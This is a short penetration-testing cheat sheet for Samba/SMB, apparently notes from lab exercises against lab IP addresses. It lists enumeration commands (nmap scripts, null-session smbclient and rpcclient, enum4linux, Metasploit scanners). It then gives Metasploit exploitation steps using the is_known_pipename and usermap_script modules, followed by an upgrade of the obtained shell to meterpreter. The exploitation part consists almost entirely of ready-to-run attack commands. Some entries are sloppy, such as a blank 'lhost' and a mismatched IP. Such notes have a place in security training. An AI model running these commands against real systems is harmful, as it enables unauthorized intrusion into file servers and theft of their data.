# SAMBA

## SAMBA 1 Enum

```bash
nmap -sU --top-ports 25 192.126.66.3

nmap -sV -p 445 192.126.66.3

nmap --script smb-os-discovery.nse -p 445 192.126.66.3

Metasploit
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.126.66.3
exploit

NetBios
nmap --script smb-os-discovery.nse -p 445 192.126.66.3

nmblookup -A 192.126.66.3

smbclient -L 192.126.66.3 -N

rpcclient -U "" -N 192.126.66.3
srvinfo
```

## SAMBA 2 Enum

```bash

Enum
smbmap -u User -p Pass -H IP -R Data
smbmap -u User -p Pass -H IP -R Data xml

rpcclient -U "" -N 192.144.106.3
srvinfo  --OS version
lookupnames admin --SSID

enum4linux -o 192.144.106.3 --OS version
enumdomusers

enum4linux -o 192.144.106.3
enum4linux -U 192.144.106.3

smbclient -L 192.144.106.3 -N -- Description of Samba

Metsploit 
msfconsole
use auxiliary/scanner/smb/smb2 
set RHOSTS 192.144.106.3
exploit

nmap --script smb-enum-users.nse -p445 192.144.106.3 --Users

Metasploit
msfconsole
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.144.106.3
exploit

Metasploit
msfconsole
use auxiliary/scanner/smb/smb_enumshares --Shares
set RHOSTS 192.144.106.3
exploit

enum4linux -S 192.144.106.3
smbclient -L 192.144.106.3 -N
enum4linux -G 192.144.106.3

rpcclient -U "" -N 192.144.106.3
enumdomgroups

smbclient //192.144.106.3/public -N
```

## SAMBA Exploitation

```bash
nmap -sS -sV 192.218.210.3

Metasploit
use exploit/linux/samba/is_known_pipename
set RHOST 192.218.210.3
check
exploit
ctrl + z 

use post/multi/manage/shell_to_meterpreter
set lhost 
set session
run

nmap -sV  -p 445 10.2.17.132
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.2.217.132
run

searchsploit samba 3.0.20
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.2.217.132
exploit
```